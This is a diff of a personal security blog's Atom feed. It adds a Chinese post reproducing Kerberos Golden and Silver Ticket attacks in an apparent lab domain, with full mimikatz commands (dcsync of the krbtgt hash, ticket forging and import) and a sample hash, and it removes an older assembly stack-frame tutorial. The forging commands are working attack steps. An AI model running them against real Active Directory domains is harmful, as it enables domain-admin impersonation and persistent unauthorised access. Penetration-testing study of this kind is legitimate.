@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://sherlocz.github.io/"/>
-  <updated>2020-09-17T16:49:43.062Z</updated>
+  <updated>2020-09-19T17:53:25.186Z</updated>
   <id>http://sherlocz.github.io/</id>
   
   <author>
@@ -15,6 +15,31 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>kerberos协议中的票据传递攻击</title>
+    <link href="http://sherlocz.github.io/2020/09/20/kerberos-PtT/"/>
+    <id>http://sherlocz.github.io/2020/09/20/kerberos-PtT/</id>
+    <published>2020-09-19T16:08:10.000Z</published>
+    <updated>2020-09-19T17:53:25.186Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="PtT"><a href="#PtT" class="headerlink" title="PtT"></a>PtT</h1><p>Pass the Ticket，基于Kerberos协议进行攻击，通常是用来做<strong>权限维持</strong></p><h1 id="Golden-Ticket"><a href="#Golden-Ticket" class="headerlink" title="Golden Ticket"></a>Golden Ticket</h1><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>client端在和KDC进行认证的过程中，TGT是由域内krbtgt用户hash计算生成，所以当我们得到了域内krbtgt用户的NTLM 哈希或AES-256的值，可以将权限伪装成任意域内用户(包括域管用户)。</p><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>漏洞前提：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.要伪装的域内用户名</span><br><span class="line">2.krbtgt用户hash</span><br><span class="line">3.krbtgt用户sid</span><br><span class="line">4.域名</span><br></pre></td></tr></table></figure></p><p>利用mimikatz可以进行伪造</p><p>首先我们要知道krbtgt的相关信息，在域控制器中执行命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">lsadump::dcsync /user:krbtgt</span><br></pre></td></tr></table></figure></p><p><img src="/2020/09/20/kerberos-PtT/1.png" alt></p><p>获取到sid(sid去除id后面的502)和ntlm hash如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sid:S-1-5-21-306775267-2343279330-10040798</span><br><span class="line">hash:8fe2af5ffd00a2b58a9a42c8c95ee373</span><br></pre></td></tr></table></figure></p><p>接下来在域内一台机器上生成Golden Ticket：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line"></span><br><span class="line">kerberos::golden /user:hacke\administrator /domain:hacke.testlab/sid:S-1-5-21-306775267-2343279330-10040798 /krbtgt:8fe2af5ffd00a2b58a9a42c8c95ee373 /ptt  </span><br><span class="line"></span><br><span class="line">kerberos::ptt C:\Users\oreo\Desktop\ticket.kirbi #导入票据</span><br></pre></td></tr></table></figure></p><p><img src="/2020/09/20/kerberos-PtT/2.png" alt></p><p>成功导入，可以利用cmd下的klist命令查看导入的票据。</p><p>这里导入票据之后，我们可以看下是否能够伪造身份：</p><p><img src="/2020/09/20/kerberos-PtT/3.png" alt></p><p>dir 域控的目录，能够成功访问，说明票据成功</p><h1 id="Silver-Ticket"><a href="#Silver-Ticket" class="headerlink" title="Silver Ticket"></a>Silver Ticket</h1><h2 id="漏洞原理-1"><a href="#漏洞原理-1" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>伪造ST服务票据，不需要和KDC进行交互，动静较小</p><h2 id="复现过程-1"><a href="#复现过程-1" class="headerlink" title="复现过程"></a>复现过程</h2><p>漏洞前提：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.伪造的用户名</span><br><span class="line">2.用户hash</span><br><span class="line">3.用户sid</span><br></pre></td></tr></table></figure></p><p>首先我们用mimikatz来读取计算机的hash<br><img src="/2020/09/20/kerberos-PtT/4.png" alt></p><p>获取sid<br><img src="/2020/09/20/kerberos-PtT/5.png" alt><br>在域内任意一台机器上制作Silver Ticket<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /domain:hacke.testlab /sid:S-1-5-21-306775267-2343279330-10040798 /target:dc.hacke.testlab /service:cifs /rc4:&#123;ntlm hash&#125; /user:administrator /ptt</span><br></pre></td></tr></table></figure></p><p><img src="/2020/09/20/kerberos-PtT/6.png" alt></p><p>再次访问dc的c$<br><img src="/2020/09/20/kerberos-PtT/3.png" alt></p><h1 id="Ending"><a href="#Ending" class="headerlink" title="Ending"></a>Ending</h1><p>当我们使用票据成功后，后续可使用psexec.exe与目标机器进行交互cmd shell</p><p><a href="https://github.com/crupper/Forensics-Tool-Wiki/blob/master/windowsTools/PsExec64.exe" target="_blank" rel="noopener">https://github.com/crupper/Forensics-Tool-Wiki/blob/master/windowsTools/PsExec64.exe</a></p><p>不过这两个都是属于后门维持的攻击，还是MS14-068好用啊</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h1 id=&quot;PtT&quot;&gt;&lt;a href=&quot;#PtT&quot; class=&quot;headerlink&quot; title=&quot;PtT&quot;&gt;&lt;/a&gt;PtT&lt;/h1&gt;&lt;p&gt;Pass the Ticket，基于Kerberos协议进行攻击，通常是用来做&lt;strong&gt;权限维持&lt;/strong&gt;&lt;/p&gt;
+&lt;
+      
+    
+    </summary>
+    
+    
+    
+      <category term="内网渗透" scheme="http://sherlocz.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
+    
+  </entry>
   
   <entry>
     <title>CVE-2020-1472(域内提权)漏洞复现</title>
@@ -490,37 +515,6 @@
     
     
       <category term="内网渗透" scheme="http://sherlocz.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>堆栈图练习</title>
-    <link href="http://sherlocz.github.io/2020/02/26/%E5%A0%86%E6%A0%88%E5%9B%BE%E7%BB%83%E4%B9%A0/"/>
-    <id>http://sherlocz.github.io/2020/02/26/堆栈图练习/</id>
-    <published>2020-02-26T12:50:21.000Z</published>
-    <updated>2020-02-28T06:04:00.553Z</updated>
-    
-    <content type="html"><![CDATA[<p>最近学了好多东西但是懒得写，感觉太懒了，最近学习了堆栈，实在是东西太多啦，这里做个笔记，也没啥观赏性。</p><ul><li>DTDebug</li><li>HelloWorld.exe</li></ul><p>目标开始地址：0x401168<br><img src="/2020/02/26/堆栈图练习/1.png" alt><br>从这个地址的三行汇编代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PUSH 2//将十六进制的2存储到堆栈中</span><br><span class="line">PUSH 1//将十六进制的1存储到堆栈中</span><br><span class="line">CALL HelloWor.0040100A//goto这个地址</span><br></pre></td></tr></table></figure></p><p>这里的栈顶和栈底(也就是ESP和EBP的值):<br>ESP 0019FFE4<br>EBP 0019FF30 </p><p>call命令的时候会存入一个内存地址，就是call这行的内存地址加上占用的字节，这里call命令占用了5个字节，所以将会在堆栈中保存当前内存+5的地址，也就是会保存(0040116C+5)401171</p><p>call命令会将call后面的地址给EIP并会跳转到这个地址，所以我们的EIP地址将会为0040100A</p><p>由于push和call的时候要入栈，所以这里我们的栈顶的值会变化</p><p>所以我们这里可以画出堆栈图<br><img src="/2020/02/26/堆栈图练习/2.png" alt></p><p>然后跳转到了40100A地址，这一行看到了JMP<br><img src="/2020/02/26/堆栈图练习/3.png" alt></p><p>JMP命令只会修改EIP的值，堆栈并不改变，然后会继续走下去到401040<br><img src="/2020/02/26/堆栈图练习/4.png" alt></p><p>这里接下来一直到RETN就是我们剩下要分析的汇编代码</p><p>首先<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PUSH EBP</span><br></pre></td></tr></table></figure></p><p>将EBP的值入栈，栈顶的值-4</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MOV EBP,ESP</span><br></pre></td></tr></table></figure><p>将ESP的值赋予给EBP</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SUB ESP,40</span><br></pre></td></tr></table></figure><p>ESP的值减去十六进制的四十，这里其实就是栈顶要增加，这一步的原因是为了流出缓存出来</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PUSH EBX</span><br><span class="line">PUSH ESP</span><br><span class="line">PUSH EDI</span><br></pre></td></tr></table></figure><p>将 EBX、ESP、EDI的值入栈，栈顶+12</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LEA EDI,DWORD PTR SS:[EBP-40]</span><br></pre></td></tr></table></figure><p>将EBP-40的地址赋值给EDI</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">MOV ECX,10</span><br><span class="line">MOV EAX,CCCCCCCC</span><br><span class="line">REP STOS DWORD PTR ES:[EDI]</span><br></pre></td></tr></table></figure><p>这一步的目的是为了清除多余的垃圾缓存，重复十次，将值赋值成CCCCCCCC</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MOV EAX,DWORD PTR SS:[EBP+8]</span><br><span class="line">ADD EAX,DWORD PTR SS:[EBP+C]</span><br></pre></td></tr></table></figure><p>这两步的意思就是将我们刚存进来的1和2相加</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POP EDI</span><br><span class="line">POP ESI</span><br><span class="line">POP EBX</span><br><span class="line">MOV ESP,EBP</span><br><span class="line">POP EBP</span><br><span class="line">RETN</span><br></pre></td></tr></table></figure><p>清除缓存，就不详细分析了</p><p>这里就会返回到刚开始CALL后的下一行<br><img src="/2020/02/26/堆栈图练习/4.png" alt><br>这里有一个ADD操作，因为到这一步的时候栈顶和栈底的值和刚开始的时候不一样，要恢复成刚开始的样子，这一步叫做堆栈平衡</p><p>完~</p><p>图不画了~懒<br><img src="/2020/02/26/堆栈图练习/6.png" alt></p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;p&gt;最近学了好多东西但是懒得写，感觉太懒了，最近学习了堆栈，实在是东西太多啦，这里做个笔记，也没啥观赏性。&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;DTDebug&lt;/li&gt;
-&lt;li&gt;HelloWorld.exe&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;目标开始地址：0x401168&lt;br&gt;&lt;img sr
-      
-    
-    </summary>
-    
-    
-    
-      <category term="汇编" scheme="http://sherlocz.github.io/tags/%E6%B1%87%E7%BC%96/"/>
-    
-      <category term="逆向" scheme="http://sherlocz.github.io/tags/%E9%80%86%E5%90%91/"/>
     
   </entry>
   
